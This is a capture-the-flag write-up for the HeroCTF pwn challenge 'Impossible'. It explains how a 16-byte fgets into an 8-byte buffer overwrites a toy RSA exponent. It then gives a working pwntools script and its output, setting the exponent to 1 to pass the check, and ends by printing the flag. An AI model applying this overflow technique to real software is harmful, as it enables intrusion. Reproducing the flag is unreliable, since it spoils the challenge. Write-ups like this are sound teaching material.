# Impossible

### Category

Pwn

### Description

Your colleague trolls you by giving you an impossible challenge, betting $100 that you won't succeed.<br>
Show him who's the boss!

**Host** : pwn.heroctf.fr<br>
**Port** : 8001

Format : **Hero{flag}**<br>
Author : **SoEasY**

### Files

 - [Impossible](Impossible)

### Write up

After opening the challenge in IDA, we can take a look at the main:
```c
int __cdecl main(int argc, const char **argv, const char **envp){
  unsigned int v3; // eax
  unsigned int v4; // r12d
  unsigned int v5; // ebx
  unsigned int v6; // eax
  char v8; // [rsp+1Bh] [rbp-25h]
  FILE *stream; // [rsp+28h] [rbp-18h]

  puts(
    "If you can find a value such that encrypt(value) == 12345, I'll give you my flag.\n"
    "But don't try to much, it's impossible: I'm using a home made RSA algorithm with random values!");
  fflush(_bss_start);
  v3 = time(0LL);
  srand(v3);
  p = rand() % 36341 + 10000;
  srand(p);
  q = rand() % 36341 + 10000;
  srand(q);
  e = rand() % 36341 + 10000;
  n = p * q;
  phi = (p - 1) * (q - 1);
  printf("Enter a value to encrypt: ");
  fflush(_bss_start);
  fgets(m, 16, stdin);
  v4 = n;
  v5 = e;
  v6 = atoi(m);
  
  if ( (unsigned int)modular_exponentiation(v6, v5, v4) == 12345){
    stream = fopen("flag.txt", "r");
    while ( 1 ){
      v8 = fgetc(stream);
      if ( v8 == -1 )
        break;
      putchar(v8);
    }
  }else{
    puts("I told you, no one can solve this. You'll never get my flag!");
  }
  fflush(_bss_start);
  return 0;
}
```

So this is basically an RSA encryption algorithm with random values as p, q and e which is annoying.

We can see that an integer `m` is read on stdin on 16 bytes as a string and will later be converted to an int with the `atoi()` function. Let's see `m` in memory:
```x86asm
.bss:0x4040 m         db 8 dup(?)
.bss:0x4048 e         dd ?
```

We can here see that the `m` value is a `char[8]`: if we enter more than 8 bytes in `m`, we will overflow on the `e` value which is very interesting because `e` is the exponent in the RSA encryption algorithm !

if `e=1`, we will have cipher == clear !
So the plan is to have `m=12345` with `e=1` so that `c=12345`.

```py
from pwn import *

r = process("./Impossible")

buf = b'12345'
# This way, atoi(12345\x00\x00\x00) = 12345
buf += b'\x00' * 3
# e = 1
buf += p64(1)

log.success(f"Payload length: {len(buf)}")
r.sendline(buf)
flag = r.recvall().split(b' ')[-1].decode()
info(f"FLAG: {flag}")

```
Result:
```
$ python3 solve.py 
[+] Starting local process './Impossible': pid 168319
[+] Payload length: 16
[+] Receiving all data: Done (250B)
[*] Process './Impossible' stopped with exit code 0 (pid 168319)
[*] FLAG: Hero{Th3r3_1s_n0_w4y_y0u_d1d_1t_CH34T3R!!!!!}
```

### Flag

```
Hero{Th3r3_1s_n0_w4y_y0u_d1d_1t_CH34T3R!!!!!}
```
